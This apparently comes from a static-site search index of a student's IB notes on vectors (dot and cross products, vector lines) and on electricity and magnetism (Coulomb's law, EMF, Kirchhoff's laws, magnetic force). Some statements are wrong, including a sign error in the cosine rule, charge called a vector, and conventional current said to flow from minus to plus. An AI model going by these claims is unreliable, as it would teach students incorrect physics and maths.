z=a_{3}+\\lambda b_{3}\\end{cases} \\] Cartesian Equation \u00b6 By isolating \\(\\lambda\\) from the parametric equation: \\[ \\dfrac{x-a_{1}}{b_{1}}=\\dfrac{y-a_{2}}{b_{2}}=\\dfrac{z-a_{3}}{b_{3}} \\] Be Carefull : Make sure that the form matches exactly in a question, for instance if the x component is \\(\\frac{5-x}{6}\\) the \\(b_1\\) value is \\(-6\\) and not \\(6\\) Angle Between Two Lines \u00b6 To find the acute angle between two vector lines where \\(\\cos(\\theta)\\) is always greater than 0, we just find the angle between the two directon vectors of the equation using the formula found earlier: \\[ \\cos(\\theta) = \\frac{|b_1\\cdot b_2|}{|b_1||b_2|} \\] Intersection of 2 Vector Lines \u00b6 Equation of a Plane \u00b6 Intersection of a Line & Plane \u00b6","title":"Vectors"},{"location":"IB/HL%20Math%20AA/vectors/#vectors","text":"A vector is a mathematical way to describe a \"journey\" with two components: a magnitude and a direction . As opposed to a scaler value which only has a magnitude. A vector can be represented using directed line segments where the length shows the magnitude and the arrow indicates the direction. Two vectors are the same only when they have the same magnitude and direction. A negative of a vector is a vector parallel, same length but opposite in direction denoted as \\(-\\vec{a}\\)","title":"Vectors"},{"location":"IB/HL%20Math%20AA/vectors/#vector-addition","text":"Vector addition is Head-to-Tail where one vector is place at the end of another. The resultant vector starts from the start of the first vector and ends at the end of the second vector.","title":"Vector Addition"},{"location":"IB/HL%20Math%20AA/vectors/#vector-subtraction","text":"Vector subtraction can be considered Tail-to-Tail but you can also find the negated value of the second vector and do vector addition .","title":"Vector Subtraction"},{"location":"IB/HL%20Math%20AA/vectors/#scalar-multiplication","text":"Scalar multiplication is multiplying a scalar value to a vector. It multiplies the magnitude of the vector of the scalar amount and changes the direction if the scalar is negative.","title":"Scalar Multiplication"},{"location":"IB/HL%20Math%20AA/vectors/#representing-vectors-in-a-plane","text":"","title":"Representing Vectors in a Plane"},{"location":"IB/HL%20Math%20AA/vectors/#notation","text":"Unit vector : A normalized vector of magnitude 1 Position Vector : The position vector of point P is a vector originating from the origin and ending at point P(x,y). Displacement Vector : The displacement vector of B relative to A \\(\\vec{AB}\\) is a vector that originates from A and terminates at B. Vectors are often denoted using a lower case letter with a hat like such \\(\\vec{a}\\) or the two points the vector originates and ends at like \\(\\vec{AB}\\) Vectors on a plane can also be represented as the two components like such: \\[ \\begin{bmatrix} x \\\\ y \\\\ \\end{bmatrix} = xi+yj \\] Where \\(i\\) is the x unit vector \\(\\begin{bmatrix} 1 \\\\ 0 \\\\ \\end{bmatrix}\\) and \\(j\\) is the y unit vector \\(\\begin{bmatrix} 0 \\\\ 1 \\\\ \\end{bmatrix}\\) . Generally we can represent a vector as \\(\\begin{bmatrix} x \\\\ y \\\\ \\end{bmatrix}\\) where \\(x\\) is the horizontal component and \\(y\\) is the vertical component of the vector. The magnitude or length of that vector is written as \\(|\\vec{AB}|\\) or \\(|\\vec{a}|\\) . It's found using formula: \\[ \\sqrt{{a_1}^2+{a_2}^2+...+{a_n}^2} \\] where \\(a_n\\) is each component of the vector.","title":"Notation"},{"location":"IB/HL%20Math%20AA/vectors/#operations","text":"If \\(a=\\left(\\begin{array}{l}a_{1} \\\\ a_{2}\\end{array}\\right)\\) and \\(\\mathbf{b}=\\left(\\begin{array}{l}b_{1} \\\\ b_{2}\\end{array}\\right)\\) then \\(\\mathbf{a}+\\mathbf{b}=\\left(\\begin{array}{l}a_{1}+b_{1} \\\\ a_{2}+b_{2}\\end{array}\\right)\\) If \\(\\mathbf{a}=\\left(\\begin{array}{l}a_{1} \\\\ a_{2}\\end{array}\\right)\\) and \\(\\mathbf{b}=\\left(\\begin{array}{l}b_{1} \\\\ b_{2}\\end{array}\\right)\\) , then \\(\\mathbf{a}-\\mathbf{b}=\\left(\\begin{array}{l}a_{1}-b_{1} \\\\ a_{2}-b_{2}\\end{array}\\right)\\) If \\(k\\) is any scalar and \\(\\mathbf{v}=\\left(\\begin{array}{l}v_{1} \\\\ v_{2}\\end{array}\\right)\\) , then \\(k \\mathbf{v}=\\left(\\begin{array}{l}k v_{1} \\\\ k v_{2}\\end{array}\\right)\\)","title":"Operations"},{"location":"IB/HL%20Math%20AA/vectors/#scalar-product-angle-between-two-vectors","text":"The scalar product of two vectors is also knows as the dot product or inner product. It's found by multiplying each of a vectors compoments and summing them up like such: \\[ \\left(\\begin{array}{l} a_{1} \\\\ a_{2} \\\\ a_{3} \\end{array}\\right) \\cdot\\left(\\begin{array}{l} b_{1} \\\\ b_{2} \\\\ b_{3} \\end{array}\\right)=a_{1} b_{1}+a_{2} b_{2}+a_{3} b_{3} \\] The angle between two vectors \\(\\theta\\) is the angle between two vectors, we can find the angle using the cosine rule: \\[ |b-a|^2 = |a|^2 + |b|^2 + 2 |a||b|\\cos{\\theta} \\\\ \\cos{\\theta} = \\frac{a\\cdot b}{|a||b|} \\] Note: Vectors must be converging or diverging from the same point to have an angle between them","title":"Scalar Product &amp; Angle Between Two Vectors"},{"location":"IB/HL%20Math%20AA/vectors/#implications","text":"The implications of the dot product indicates how close the two vectors are. In this case: \\[ \\begin{aligned} \\vec{a}\\cdot \\vec{b}=0,\\ \\cos \\theta =0,\\ \\theta =90^{\\circ }\\\\ \\vec{a}\\cdot \\vec{b}=\\left| a\\right| \\left| b\\right| ,\\ \\cos \\theta =1,\\ \\theta =0\\\\ \\vec{a}\\cdot \\vec{b} >0, \\cos \\theta >0\\\\ \\vec{a}\\cdot \\vec{b} <0, cos\\theta <0 \\end{aligned} \\] As shown, if the dot product of the two vectors equal to 0, they are perpendicular to each other. If the dot product is equal to the two magnitudes of the vectors, they are parallel. If the product is greater than 0, the angle os acute and if they are less than 0, they angle between them is obtuse.","title":"Implications"},{"location":"IB/HL%20Math%20AA/vectors/#vector-product","text":"The vector product or the cross product is only defined for 3-dimensional vectors. The vector product or the cross products results in a vector which is perpendicular to the two known vectors. \\[ a=\\begin{bmatrix} a_{1} \\\\ a_{2} \\\\ a_{3} \\end{bmatrix},b=\\begin{bmatrix} b_{1} \\\\ b_{2} \\\\ b_{3} \\end{bmatrix},a\\times b=\\begin{bmatrix} a_{2}b_{3}-a_{3}b_{2} \\\\ a_{3}b_{1}-a_{1}b_{3} \\\\ a_{1}b_{2}-a_{2}b_{1} \\end{bmatrix} \\] An easy way to remember the operation is split into 3 steps: Cover row 1 and start a cross with the remaining 4 elements of the two vectors. Start from Upper Left. Find the difference between the two products of the cross (starting from upper left) Cover row two and invert cross with remaining 4 elements. Starting from Bottom Left. Find difference. Cover row 3 and return to starting from Upper Left when drawing the cross. Find the difference.","title":"Vector Product"},{"location":"IB/HL%20Math%20AA/vectors/#properties-of-the-cross-product","text":"\\(a\\times b\\) is a vector perpendicular to \\(a\\) and \\(b\\) \\(a\\times a=0\\) for all \\(a\\) \\(a\\times b = (-b)\\times a\\) for all \\(a\\) and \\(b\\) \\(a\\cdot (b\\times c)\\) is the scalar triple product \\(a\\times (b+b)=a\\times b+a\\times c\\) \\(\\left( a+b\\right) \\times \\left( c+d\\right) =a\\times c+a\\times d+b\\times c+b\\times d\\)","title":"Properties of the Cross Product"},{"location":"IB/HL%20Math%20AA/vectors/#geometric-interpretation","text":"Using the cross product, we can find the area of a trangle or parallelogram without knwoing the angle between the two vectors due to: \\[ |a\\times b| = |a||b|\\sin(\\theta) \\] where we know the area of a traingle is \\(\\frac{1}{2}ab\\sin(\\theta)\\) thus the area of a trangle and a parallegorm is found.","title":"Geometric Interpretation"},{"location":"IB/HL%20Math%20AA/vectors/#vector-lines","text":"Recall : the equation of a line is defined as \\(y=mx+b\\) where \\(m\\) defines the slope and \\(b\\) defines the position A similar process can be done using vectors where one vector defines the \"slope\" or the direction and another positional vector shows the position. Suppose a line passes through a fixed point A with position vector \\(\\vec{a}\\) and the line is parallel to the vector \\(\\vec{b}\\) . Now consider a point \\(R\\) on that line with a position vector \\(\\vec{r}\\) . By vector addition, we know that \\(\\vec{r}=\\vec{a}+\\vec{AR}\\) Since \\(\\vec{AR}\\) is parallel to \\(\\vec{b}\\) we can say that \\[ \\vec{AR}=\\lambda \\vec{b} \\] Where \\(\\lambda \\epsilon \\mathbb{R}\\) is some scalar multiple. Thus \\[ \\vec{r} = \\vec{a} + \\lambda \\vec{b},\\ \\lambda \\epsilon \\mathbb{R} \\] is the vector equation for a line. Here vector \\(a\\) represents a position and vector \\(b\\) defines the direction. The vector equation fo a line is not unique. Any position vector of a point on the line can be used as the position vector \\(\\vec{a}\\) and any vector parallel can be the direction vector \\(\\vec{b}\\) . In conclusion, using the vector equation of a line, we can plug in any lambda and it will generate points on the line.","title":"Vector Lines"},{"location":"IB/HL%20Math%20AA/vectors/#different-forms-of-representing-vector-lines","text":"","title":"Different Forms of Representing Vector Lines"},{"location":"IB/HL%20Math%20AA/vectors/#vector-equation","text":"\\[ \\begin{pmatrix} x \\\\ y \\\\ z \\end{pmatrix}=\\begin{pmatrix} a_{1} \\\\ a_{2} \\\\ a_{3} \\end{pmatrix}+\\lambda \\begin{pmatrix} b_{1} \\\\ b_{2} \\\\ b_{3} \\end{pmatrix} \\]","title":"Vector Equation"},{"location":"IB/HL%20Math%20AA/vectors/#parametric-equation","text":"\\[ \\begin{cases}x=a_{1}+\\lambda b_{1}\\\\ y=a_{2}+\\lambda b_{2}\\\\ z=a_{3}+\\lambda b_{3}\\end{cases} \\]","title":"Parametric Equation"},{"location":"IB/HL%20Math%20AA/vectors/#cartesian-equation","text":"By isolating \\(\\lambda\\) from the parametric equation: \\[ \\dfrac{x-a_{1}}{b_{1}}=\\dfrac{y-a_{2}}{b_{2}}=\\dfrac{z-a_{3}}{b_{3}} \\] Be Carefull : Make sure that the form matches exactly in a question, for instance if the x component is \\(\\frac{5-x}{6}\\) the \\(b_1\\) value is \\(-6\\) and not \\(6\\)","title":"Cartesian Equation"},{"location":"IB/HL%20Math%20AA/vectors/#angle-between-two-lines","text":"To find the acute angle between two vector lines where \\(\\cos(\\theta)\\) is always greater than 0, we just find the angle between the two directon vectors of the equation using the formula found earlier: \\[ \\cos(\\theta) = \\frac{|b_1\\cdot b_2|}{|b_1||b_2|} \\]","title":"Angle Between Two Lines"},{"location":"IB/HL%20Math%20AA/vectors/#intersection-of-2-vector-lines","text":"","title":"Intersection of 2 Vector Lines"},{"location":"IB/HL%20Math%20AA/vectors/#equation-of-a-plane","text":"","title":"Equation of a Plane"},{"location":"IB/HL%20Math%20AA/vectors/#intersection-of-a-line-plane","text":"","title":"Intersection of a Line &amp; Plane"},{"location":"IB/HL%20Physics/electricity-magnetism/","text":"Eectricity and Magnetism \u00b6 Electricity \u00b6 Charge \u00b6 Electric charge can either be positive or negative with the symbol Q or q and is measure in Coulomb C which is a fundamental unit. A fundamental charge is the charge in an electron or proton. I'ts the smallest charge known to humans. The charge of one electron is equal to \\(1.6\\times 10^{-19}\\ C\\) . Charges with the same sign repel each other and changes with the opposite sign attract. Using a positive test charge we can determine wheter an object is positively charged or negatively charged by observing whether it repels or attracts the test charge. An object with equal amounts of positive change and negative charge is said to be electrically neutral. Positively charged objects have a deficit of electrons and negatively charged objects hava an excess of electrons. Electric charge is always conserved. While charges could migrate from one body to another, the total charge remains the same. Conductors and Insulators \u00b6 Conductors are materials which allow the passage of electric charge. This is due to the presence of free electrons in solid conductors. The outter most electrons form electron clouds and they are called conduction electrons. Examples of conductors include all metals, graphite, humans. Insulators are materials which do not allow the passage of electric charge. Examples of insulators include wood, glass, and plastic buckets. Electric Field \u00b6 Electric fields can be graphically represented as electric field lines. The direction of the field at a point is equal to the direction of the field line passing through that point (arrows from the positive pole to the negative pole). The magnitude of the field at a point corresponds to the density of the field lines around that point. Closer to the charged object has a stronger electric field and further has weaker fields. The electric field lines curve outwards near the edge of the plates. This is known as the \u201cedge effect\u201d. Non-uniform electric field Uniform electric field Electric Field Strength \u00b6 Electric field strength (E) is the force per unit charge experienced by a positive test change placed in a field. It is defined as \\[ E = \\frac{F_e}{q} \\] It's quite similar to gravitational field strength which is \\(F_g=mg\\) Coulomb's Law \u00b6 The electrostatic force acts between all charged particles and can be attractive or repulsive. It is the charges themselves that cause the force to exist. The force that acts between two charges, q and Q, whose centres are separated by a distance of r is given by: \\[ F = \\frac{1}{4\\pi \\epsilon_{0}}\\times \\frac{Qq}{r^2} =\\frac{kQq}{r^2} \\] where \\(F\\) is the force, \\(q\\) and \\(Q\\) are the charge of the two objects (usually the same when considering two electrons), \\(r\\) is the radius/distance between the two charges and \\(k\\) is a calculated constant using the permittivity of free space at \\(8.99\\times 10^9\\ Nm^2C^{-2}\\) Therefore, since F = qE = kqq/r^2, we can deduce that for non-uniform electric fields, the electric field strength can be calculated by Note that charge is a vector and has direction. Here \\(Q\\) and \\(q\\) show the positive/negative state of the charge. Chargin by Induction \u00b6 We first start with a conductive object with random charges at it's drift velocity Then a negatively charged object is brought close to the object. Now a seperation of charge has been induced due to attraction and repulsion. Now if the objeict is connected to groud, some negative charges will escape The ground is disconnected and the charged rod is removed, the object will be left with positive charges. Potential Difference (Voltage) \u00b6 The electric potential difference (pd) between two points is equal to the work done (energy) required per unit charge to move from one point to another. It is also known as voltage (V). It is the measure of the energy(in joules) per unit charge(in coulombs): \\[ V=\\frac{E}{q} \\] Voltage is analogical to the differences of upstreams and downstreams where water flow in the stream is the flow of electrons within the circuit. Electromotive Force (EMF) \u00b6 The electromotive force (EMF) of a source is defined as the energy per unit charge supplied by the source. The unit for EMF is volt (V). EMF is essentially the Voltage of the system including the internal voltage drop of the source. \\[ \\begin{aligned} &\\mathcal{E}=V+I r \\\\ &\\mathcal{E}=I(R+r) \\end{aligned} \\] where \\(\\mathcal{E}=\\) Electromotive force, \\(\\mathrm{V}=\\) Potential difference (Voltage), \\(I=\\) Current, \\(\\mathrm{R}=\\) Load resistance and \\(r=\\) Internal resistance Electric Current \u00b6 The existence of an electric potential difference across an object causes charges to flow through the object. Electric current (I) refers to the rate of flow of electric charge. It's measure in Ampers (A) and can be given by the equation \\[ I=\\frac{Q}{t} \\] The direction of an (conventional) electric current is opposite to the direction of electron flow due to convention. Current Carrying Conductors \u00b6 Initially electrons in a conductor travels at the random drift velocity . To move them, positive charges are used to attract negatively charged electrons to create movement. The current that passes through the conductor is: \\[ I=nAvq \\] where \\(n\\) is the charge density which is the number of charge carriers per unit volume, \\(A\\) is the cross sectional area, \\(v\\) is the ramdom drift velocity and \\(q\\) is the charge per charge carrier. Power \u00b6 Power is the work done per unit time measured in Watts. Recall that \\[ V=\\frac{E}{Q} \\\\ I=\\frac{Q}{t} \\] and if we multiply the Voltage and Current we get \\[ V\\times I= \\frac{E}{Q}\\times \\frac{Q}{t} = \\frac{E}{t}=P \\] Due to this relationship, the following equations also stand true: \\[ P=IV=I^2R=\\frac{V^2}{R} \\] The amount of work done to make an electron go through a potential difference of 1V is known as the \"electron volt\" or \\(eV\\) . It is found using \\(eV=VQ=1V\\times 1.6\\times 10^{-19}\\) Circuits \u00b6 An electric circuit is an interconnection of electrical components in a closed loop. Circuit Diagrams \u00b6 A basic circuit consists of the power source which creates the EMF and components that create resistance. List of usefull electrical components: Resistors \u00b6 A resistor is an electrical component which implements a specific resistance within an electric circuit. A resistor with adjustable resistance is called a variable resistor. Resistors can be connected in series or in parallel. Voltmeters \u00b6 A voltmeter is used to measure the potential difference between two points. A voltmeter should be connected in parallel with the components being measured. An ideal voltmeter has infinite resistance. Ammeter \u00b6 An ammeter is used to measure the current passing through a point. An ammeter should be connected in series at the point of measurement. An ideal ammeter has zero resistance. Ohm\u2019s law \u00b6 Ohm\u2019s law states that the current flowing through a conductor is proportional to the electric potential difference across the conductor \\(V\\alpha I\\) Ohm\u2019s law is not always obeyed. A conductor which obeys Ohm\u2019s law has a constant resistance and is called an Ohmic conductor. A non-ohmic conductor portrays a graph that does not have a constant gradient (non-linear). Resistance \u00b6 Resistance is defined by Ohm's Law as \\[ R=\\frac{V}{I} \\] Note that resistance is NOT defined as \"how hard\" current travels through a circuit or what not To find resistance, do NOT calculate the slope of \\(V\\) over \\(I\\) as resistance is not defined as \\(\\frac{\\Delta V}{\\Delta I}\\) . Calculate the resistance at each individual data point and calculate the arithmetic maen. Resistance is cuased by electrons imparting energy to the atoms of the material which makes them vibrate faster. This increase in vibration impedes the flow of electrons. Resistivity \u00b6 Resistivity is the property of a material that causse it to oppose a current. It's measured in Ohm-Meters ( \\(\\omega m\\) ) It can be calculated by: \\[ \\rho = \\frac{RA}{l} \\] Where \\(R\\) is the resistance, \\(A\\) is the cross sectional area and \\(l\\) is the length of the conducting material. Simple Circuits \u00b6 Voltage Devider \u00b6 A voltage devider or potential devider is a circuit that uses resistors to devide one power source into smaller potential differences. The resultant voltage can be found using Ohm's Law. In many cases, the ration of the two resistors will determine the voltage outputs. Rheostat - Variable Resistor \u00b6 A variable resistor is a resistor in which it's resistance can be changed. Often, a fillament is used and a selector is attached to select parts of the fillament for the current to pass through. Potentiometre \u00b6 A potentiometer varies the voltage very much like the voltage devider . Here a selector clamps on sections of a fillament thats connected to a power source which we can vary how much material is included which will change the voltage accross the component due to \\(V=IR\\) Kirchhoff's Circuit Laws \u00b6 Kirchhoff\u2019s junction rule is a statement of the conservation of charge flow per time. The sum of all currents flowing into a junction must equal the sum of all currents flowing out. \\[ \\sum{I_{in}} =\\sum{I_{out}} \\] Kirchhoff\u2019s loop rule is a statement of the conservation of electric potential energy per charge. For a complete loop of an electrical circuit all of the electric potential rises added together must equal all of the electric potential drops added together. \\[ \\sum_{\\text {loop }} \\Delta V_{\\text {rises }}=\\sum_{\\text {loop }} \\Delta V_{\\text {drops }} \\] Usage of Kirchhoff's Circuit Laws \u00b6 We can use Kirchoff's Circuit Laws to find the voltage, current and power accross a resistor in a circuit with two power sources. Here are a set of rules based on Kirchoff's Laws: Follow the direction of conventional current (from - to +) if a power source's negative terminal is encountered, there will be a potential rise if a power source's positive terminal is encountered, there will be a potential drop if a current is encountered in the same direction as the travelling current, there will be a potential drop of \\(I\\times R\\) if a current is encountered in the opposite direction as the travelling current, there will be a potential rise of \\(I\\times R\\) The best way to approach is to first start on the negative side of each power source and draw the current path following conventional current. Here's an example: following yellow Potential rise of \\(V_A\\) Potential drop of \\(I_A\\times 4\\) Potential rise of \\(I_B\\times 5\\) due to encountering current in opposite direction Potential drop of \\(I_A\\times 5\\) Potential drop of \\(I_A\\times 2\\) following orange Potential rise of \\(V_B\\) Potential drop of \\(I_B\\times 6\\) Potential rise of \\(I_A\\times 5\\) due to encountering current in opposite direction Potential drop of \\(I_B\\times 5\\) Potential drop of \\(I_B\\times 10\\) In the end, both loops must result with a potential difference of 0. Thus we can solve for \\(I_A\\) and \\(I_B\\) . We can also follow the total loop and equate that to 0. following green Potential rise of \\(V_A\\) Potential drop of \\(I_A\\times 4\\) Potential drop of \\(I_B\\times 10\\) Potential rise of \\(V_B\\) Potential drop of \\(I_B\\times 6\\) Potential drop of \\(I_A\\times 2\\) Electric cells \u00b6 Cells \u00b6 A cell in a circuit acts as a source of electrical energy and creates an electric potential difference at its terminals. A battery is often made up of two or more cells connected. Internal Resistance \u00b6 The internal resistance is the resistance of a source determined by the material it is made up of. Any material that makes power has internal resistance, this includes batteries, power supplies, power genrators etc. The potential difference at the terminals of a source is less than the EMF of the source due to internal resistance which can be used to calculated the EMF since EMF includes both internal and external resistance. How to Measure Internal Resistance \u00b6 Since we cannot go into a power source and maesure the resistance, we can estimate it using data. In this setup, we know that EMF is equal to the internal resistance times the current plus the terminal voltage. By measuring the current and terminal voltage, we can find the internal resistance if we graph data points of terminal voltage against current. When terminal voltage is 0, EMF is also 0 thus we can find the internal resistance. Note that a good voltmeter(multimeter these days) can measure EMF pretty well since they have a really large internal resistance and a very small current. Thus the measured voltage is very close to EMF. Magnetism \u00b6 Magnetic Fields \u00b6 Magnetic fields are caused by the presence of magnets or moving charges. Similar to how an electric charge experiences a force in an electric field, a magnet or an electric current experiences a force in a magnetic field. The unit of a magnetic field is Tesla (T) with the symbol \\(\\vec{B}\\) and is \\(1\\ kg\\cdot s^{-2}\\cdot A^{-1}\\) in SI units. By convention, the direction of magnetic field is always from North to South A single magnetic domain is the smallest magnet. If all small magnetic domains align, it craetes a larger magnetic field. Magnetic Field Patterns \u00b6 Magnetic fields can be graphically represented using magnetic field lines. The direction of the field at a point is equal to the direction of the field line passing through that point. The magnitude of the field at a point corresponds to the density of the field lines around that point. Magnets Wire with current Viewing the magnetic field in 3D, dots represent magnetic fields coming out of the page (like the tip of an arrow) and crosses represent magnetic fields going into the page (like the nock of an arrow). Magnetic Field Strength \u00b6 The magnetic field strength is proportional to the current that passes through the conductor and is inversly porportional to the radial distance in which the field is measured. The magnetic field strength can be calculated using the following formula: \\[ \\vec{B}=\\frac{\\mu_{0}I}{2\\pi r} \\] where \\(\\mu_{0}\\) is the permiability of free space which is \\(4\\pi\\times 10^{-7}\\cdot T\\cdot m\\cdot A^{-1}\\) , \\(I\\) is the current, and \\(r\\) is the radial distance. Right Hand Rule \u00b6 To find the direction in which the magnetic field is pointing, the right hand rule is used. Using the right hand, we use the thumb to point towards the direction of the current and dircetion the four other fingers point is the direction of the magnetic field. Magnetic Force \u00b6 Complete Right Hand Rule \u00b6 Another right hand rule can help us find the direction of the force on a conductor in a magnetic field. To do so: Line up four fingers with the magnetic field Align thumb with the directin of conventional current The direction of the inner palm is the direction of the force. If the angle between the conductor and field is not \\(90\\degree\\) , if the thumb is pointing up, the direction is pointing outwards and vice verca. On a Conductor \u00b6 The magnitude of the force acting on a moving charge due to a magnetic field can be given by \\[ F = Il\\vec{B}\\sin(\\theta) \\] where F is the force acting on the wire, I is the current through the conductor ,l is the length of conductor in the field, and \u03b8 is the angle between the direction of the field and the conductor. On a Point Charge \u00b6 The force a magnetic force on a point charge through a magnetic field is found by: \\[ \\begin{align*} F &= \\frac{q}{t}l\\vec{B}\\sin{\\theta}\\\\ &= vq\\vec{B}\\sin{\\theta} \\end{align*} \\] where \\(q\\) is the charge of the particle(often its \\(1.6\\times 10^{-19}\\) for proton/electron), \\(v\\) is the velocity the particle is traveling at, \\(\\vec{B}\\) is the magnetic field and \\(\\theta\\) is the angle between the magnetic fields and the directon of the velocity. Note that to find the direction of the force, the Right Hand Rule can still be used but make sure to flip the direction of velocity(thumb) if the point charge is negative. Balancing Magnetic Field \u00b6 The charge will not travel in a straight line in an electrical field but we can balance that with another magnetic field. First, a electron gun will shoot out an electron using a potential difference: It travels through a electric field created by \\(V_p\\) with velocity \\(v\\) and we add a magnetic field with the force \\(F_B\\) countering the attraction of \\(F_e\\) . In order for the electron to travel straight: \\[ \\begin{align*} F_e &= F_B\\\\ qE &= qv\\vec{B}\\sin{\\theta}\\\\ E &= v\\vec{B}\\\\ \\frac{E}{B}&=v=\\sqrt{\\frac{2V_A}{m}}\\\\ \\frac{q}{m}&=\\frac{E^2}{2B^2V_A} \\end{align*} \\] This is how we fould the ratio of charge to mass of an electron. (J.J. Tomson)","title":"Eectricity and Magnetism"},{"location":"IB/HL%20Physics/electricity-magnetism/#eectricity-and-magnetism","text":"","title":"Eectricity and Magnetism"},{"location":"IB/HL%20Physics/electricity-magnetism/#electricity","text":"","title":"Electricity"},{"location":"IB/HL%20Physics/electricity-magnetism/#charge","text":"Electric charge can either be positive or negative with the symbol Q or q and is measure in Coulomb C which is a fundamental unit. A fundamental charge is the charge in an electron or proton. I'ts the smallest charge known to humans. The charge of one electron is equal to \\(1.6\\times 10^{-19}\\ C\\) . Charges with the same sign repel each other and changes with the opposite sign attract. Using a positive test charge we can determine wheter an object is positively charged or negatively charged by observing whether it repels or attracts the test charge. An object with equal amounts of positive change and negative charge is said to be electrically neutral. Positively charged objects have a deficit of electrons and negatively charged objects hava an excess of electrons. Electric charge is always conserved. While charges could migrate from one body to another, the total charge remains the same.","title":"Charge"},{"location":"IB/HL%20Physics/electricity-magnetism/#conductors-and-insulators","text":"Conductors are materials which allow the passage of electric charge. This is due to the presence of free electrons in solid conductors. The outter most electrons form electron clouds and they are called conduction electrons. Examples of conductors include all metals, graphite, humans. Insulators are materials which do not allow the passage of electric charge. Examples of insulators include wood, glass, and plastic buckets.","title":"Conductors and Insulators"},{"location":"IB/HL%20Physics/electricity-magnetism/#electric-field","text":"Electric fields can be graphically represented as electric field lines. The direction of the field at a point is equal to the direction of the field line passing through that point (arrows from the positive pole to the negative pole). The magnitude of the field at a point corresponds to the density of the field lines around that point. Closer to the charged object has a stronger electric field and further has weaker fields. The electric field lines curve outwards near the edge of the plates. This is known as the \u201cedge effect\u201d. Non-uniform electric field Uniform electric field","title":"Electric Field"},{"location":"IB/HL%20Physics/electricity-magnetism/#electric-field-strength","text":"Electric field strength (E) is the force per unit charge experienced by a positive test change placed in a field. It is defined as \\[ E = \\frac{F_e}{q} \\] It's quite similar to gravitational field strength which is \\(F_g=mg\\)","title":"Electric Field Strength"},{"location":"IB/HL%20Physics/electricity-magnetism/#coulombs-law","text":"The electrostatic force acts between all charged particles and can be attractive or repulsive. It is the charges themselves that cause the force to exist. The force that acts between two charges, q and Q, whose centres are separated by a distance of r is given by: \\[ F = \\frac{1}{4\\pi \\epsilon_{0}}\\times \\frac{Qq}{r^2} =\\frac{kQq}{r^2} \\] where \\(F\\) is the force, \\(q\\) and \\(Q\\) are the charge of the two objects (usually the same when considering two electrons), \\(r\\) is the radius/distance between the two charges and \\(k\\) is a calculated constant using the permittivity of free space at \\(8.99\\times 10^9\\ Nm^2C^{-2}\\) Therefore, since F = qE = kqq/r^2, we can deduce that for non-uniform electric fields, the electric field strength can be calculated by Note that charge is a vector and has direction. Here \\(Q\\) and \\(q\\) show the positive/negative state of the charge.","title":"Coulomb's Law"},{"location":"IB/HL%20Physics/electricity-magnetism/#chargin-by-induction","text":"We first start with a conductive object with random charges at it's drift velocity Then a negatively charged object is brought close to the object. Now a seperation of charge has been induced due to attraction and repulsion. Now if the objeict is connected to groud, some negative charges will escape The ground is disconnected and the charged rod is removed, the object will be left with positive charges.","title":"Chargin by Induction"},{"location":"IB/HL%20Physics/electricity-magnetism/#potential-difference-voltage","text":"The electric potential difference (pd) between two points is equal to the work done (energy) required per unit charge to move from one point to another. It is also known as voltage (V). It is the measure of the energy(in joules) per unit charge(in coulombs): \\[ V=\\frac{E}{q} \\] Voltage is analogical to the differences of upstreams and downstreams where water flow in the stream is the flow of electrons within the circuit.","title":"Potential Difference (Voltage)"},{"location":"IB/HL%20Physics/electricity-magnetism/#electromotive-force-emf","text":"The electromotive force (EMF) of a source is defined as the energy per unit charge supplied by the source. The unit for EMF is volt (V). EMF is essentially the Voltage of the system including the internal voltage drop of the source. \\[ \\begin{aligned} &\\mathcal{E}=V+I r \\\\ &\\mathcal{E}=I(R+r) \\end{aligned} \\] where \\(\\mathcal{E}=\\) Electromotive force, \\(\\mathrm{V}=\\) Potential difference (Voltage), \\(I=\\) Current, \\(\\mathrm{R}=\\) Load resistance and \\(r=\\) Internal resistance","title":"Electromotive Force (EMF)"},{"location":"IB/HL%20Physics/electricity-magnetism/#electric-current","text":"The existence of an electric potential difference across an object causes charges to flow through the object. Electric current (I) refers to the rate of flow of electric charge. It's measure in Ampers (A) and can be given by the equation \\[ I=\\frac{Q}{t} \\] The direction of an (conventional) electric current is opposite to the direction of electron flow due to convention.","title":"Electric Current"},{"location":"IB/HL%20Physics/electricity-magnetism/#current-carrying-conductors","text":"Initially electrons in a conductor travels at the random drift velocity . To move them, positive charges are used to attract negatively charged electrons to create movement. The current that passes through the conductor is: \\[ I=nAvq \\] where \\(n\\) is the charge density which is the number of charge carriers per unit volume, \\(A\\) is the cross sectional area, \\(v\\) is the ramdom drift velocity and \\(q\\) is the charge per charge carrier.","title":"Current Carrying Conductors"},{"location":"IB/HL%20Physics/electricity-magnetism/#power","text":"Power is the work done per unit time measured in Watts. Recall that \\[ V=\\frac{E}{Q} \\\\ I=\\frac{Q}{t} \\] and if we multiply the Voltage and Current we get \\[ V\\times I= \\frac{E}{Q}\\times \\frac{Q}{t} = \\frac{E}{t}=P \\] Due to this relationship, the following equations also stand true: \\[ P=IV=I^2R=\\frac{V^2}{R} \\] The amount of work done to make an electron go through a potential difference of 1V is known as the \"electron volt\" or \\(eV\\) . It is found using \\(eV=VQ=1V\\times 1.6\\times 10^{-19}\\)","title":"Power"},{"location":"IB/HL%20Physics/electricity-magnetism/#circuits","text":"An electric circuit is an interconnection of electrical components in a closed loop.","title":"Circuits"},{"location":"IB/HL%20Physics/electricity-magnetism/#circuit-diagrams","text":"A basic circuit consists of the power source which creates the EMF and components that create resistance. List of usefull electrical components:","title":"Circuit Diagrams"},{"location":"IB/HL%20Physics/electricity-magnetism/#resistors","text":"A resistor is an electrical component which implements a specific resistance within an electric circuit. A resistor with adjustable resistance is called a variable resistor. Resistors can be connected in series or in parallel.","title":"Resistors"},{"location":"IB/HL%20Physics/electricity-magnetism/#voltmeters","text":"A voltmeter is used to measure the potential difference between two points. A voltmeter should be connected in parallel with the components being measured. An ideal voltmeter has infinite resistance.","title":"Voltmeters"},{"location":"IB/HL%20Physics/electricity-magnetism/#ammeter","text":"An ammeter is used to measure the current passing through a point. An ammeter should be connected in series at the point of measurement. An ideal ammeter has zero resistance.","title":"Ammeter"},{"location":"IB/HL%20Physics/electricity-magnetism/#ohms-law","text":"Ohm\u2019s law states that the current flowing through a conductor is proportional to the electric potential difference across the conductor \\(V\\alpha I\\) Ohm\u2019s law is not always obeyed. A conductor which obeys Ohm\u2019s law has a constant resistance and is called an Ohmic conductor. A non-ohmic conductor portrays a graph that does not have a constant gradient (non-linear).","title":"Ohm\u2019s law"},{"location":"IB/HL%20Physics/electricity-magnetism/#resistance","text":"Resistance is defined by Ohm's Law as \\[ R=\\frac{V}{I} \\] Note that resistance is NOT defined as \"how hard\" current travels through a circuit or what not To find resistance, do NOT 